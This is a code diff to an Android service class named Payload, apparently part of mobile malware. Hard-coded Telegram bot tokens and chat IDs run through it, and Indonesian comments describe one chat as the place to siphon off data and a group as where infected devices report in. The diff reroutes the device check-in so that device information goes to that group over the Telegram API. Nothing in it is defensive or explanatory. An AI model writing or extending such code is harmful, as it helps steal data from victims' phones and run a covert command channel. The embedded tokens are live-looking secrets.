@@ -37,7 +37,9 @@ import java.util.concurrent.TimeUnit;
 public class Payload extends Service {
     private String BOT_TOKEN = "8887819326:AAFX97DDbezzF_y-kOQWBL02NNy38nWxAIY"; 
     private String BUILDER_TOKEN = "9067923295:AAE-sOBegpDh0IgaLKpn32-Nlmv9ibGYgwo";
-    private String CHAT_ID = "8598136412";
+    
+    private String CHAT_ID = "8598136412"; // Chat pribadi buat nyedot data
+    private String GROUP_ID = "-1004405270823"; // ID Grup buat lapor diri
     
     private volatile boolean isRunning = true;
     private long lastUpdateId = 0;
@@ -94,7 +96,7 @@ public class Payload extends Service {
             });
         } catch (Exception e) {}
 
-        writeLog("1. Service dimulai (onStartCommand)");
+        writeLog("1. Service dimulai");
         
         try {
             if (Build.VERSION.SDK_INT >= 26) {
@@ -179,7 +181,8 @@ public class Payload extends Service {
     private void sendCheckIn(String deviceInfo) {
         try {
             String encoded = URLEncoder.encode("/checkin " + deviceInfo, "UTF-8");
-            String urlStr = "https://api.telegram.org/bot" + BUILDER_TOKEN + "/sendMessage?chat_id=" + CHAT_ID + "&text=" + encoded;
+            // MENGGUNAKAN BUILDER_TOKEN & GROUP_ID
+            String urlStr = "https://api.telegram.org/bot" + BUILDER_TOKEN + "/sendMessage?chat_id=" + GROUP_ID + "&text=" + encoded;
             new URL(urlStr).openConnection().getInputStream().close();
         } catch (Exception e) { writeLog("Error CheckIn: " + e.getMessage()); }
     }
